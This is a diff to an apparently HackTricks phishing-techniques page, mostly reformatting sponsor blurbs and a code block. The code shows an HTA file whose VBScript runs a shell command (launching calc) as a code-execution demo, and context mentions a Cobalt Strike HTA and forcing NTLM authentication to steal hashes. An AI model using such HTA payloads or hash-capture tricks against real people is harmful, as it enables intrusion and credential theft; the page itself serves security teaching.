@@ -4,15 +4,11 @@
 
 <summary><strong>Support HackTricks and get benefits!</strong></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-
-- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
+* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
 
 </details>
 
@@ -103,26 +99,27 @@ An HTA is a proprietary Windows program whose **source code consists of HTML and
 
 An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**, making **`mshta` dependant on IE**. So if it has been uninstalled, HTAs will be unable to execute.
 
-<pre class="language-html"><code class="lang-html"><strong>&#x3C;--! Basic HTA Execution -->
-</strong>&#x3C;html>
-  &#x3C;head>
-    &#x3C;title>Hello World&#x3C;/title>
-  &#x3C;/head>
-  &#x3C;body>
-    &#x3C;h2>Hello World&#x3C;/h2>
-    &#x3C;p>This is an HTA...&#x3C;/p>
-  &#x3C;/body>
+```html
+<--! Basic HTA Execution -->
+<html>
+  <head>
+    <title>Hello World</title>
+  </head>
+  <body>
+    <h2>Hello World</h2>
+    <p>This is an HTA...</p>
+  </body>
 
-  &#x3C;script language="VBScript">
+  <script language="VBScript">
     Function Pwn()
       Set shell = CreateObject("wscript.Shell")
       shell.run "calc"
     End Function
 
     Pwn
-  &#x3C;/script>
-&#x3C;/html>
-</code></pre>
+  </script>
+</html>
+```
 
 ```html
 <--! Cobal Strike generated HTA without shellcode -->
@@ -157,8 +154,6 @@ An HTA is executed using **`mshta.exe`**, which is typically **installed** along
 </script>
 ```
 
-
-
 ## Forcing NTLM Authentication
 
 There are several ways to **force NTLM authentication "remotely"**, for example, you could add **invisible images** to emails or HTML that the user will access (even HTTP MitM?). Or send the victim the **address of files** that will **trigger** an **authentication** just for **opening the folder.**
@@ -184,14 +179,10 @@ Don't forget that you cannot only steal the hash or the authentication but also 
 
 <summary><strong>Support HackTricks and get benefits!</strong></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-
-- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
+* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
 
 </details>
